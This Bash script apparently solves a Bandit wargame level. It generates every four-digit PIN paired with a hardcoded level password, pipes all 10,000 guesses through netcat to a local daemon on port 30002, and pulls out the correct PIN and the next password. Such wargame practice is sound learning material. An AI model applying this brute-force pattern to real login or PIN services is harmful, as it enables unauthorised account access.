#!/bin/bash
#tells the operating system to run this script using the Bash shell.

PASS="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"
#PASS variable stores the password in it.

for i in {0000..9999}; do echo "$PASS $i"; done > pins.txt
# this line Generate all 10,000 possible "password pincode" guesses and save them to pins.txt.
# I want to keep this file since we need it later to look up the matching pincode.

OUT=$(nc -q 5 localhost 30002 < pins.txt)
#this line send all 10,000 guesses through a single connection to the daemon.
#all saved in the variable OUT.
LINE=$(echo "$OUT" | grep -n "Correct" | cut -d: -f1)
# LINE variable search the captured output in $OUT variable for the success message "Correct".
# "echo "$OUT" | grep -n" finds the matching line and stat it with its line number.
# "cut -d: -f1" script keep counting the line number, and stores it in LINE variable.

PINCODE=$(sed -n "${LINE}p" pins.txt | awk '{print $2}')
#PINCODE variable uses the line number to pull the matching guess from pins.txt.
# then it extracts just the pincode from that line, and then awk breaks the line into fields based on the whitespaces.

NEXT_PASS=$(echo "$OUT" | sed -n "$((LINE+1))p")
#NEXT_PASS variable Extract the line right after "Correct" from $OUT variable, which should be the bandit25 password.

echo "Pincode: $PINCODE"
echo "Bandit25 password: $NEXT_PASS"
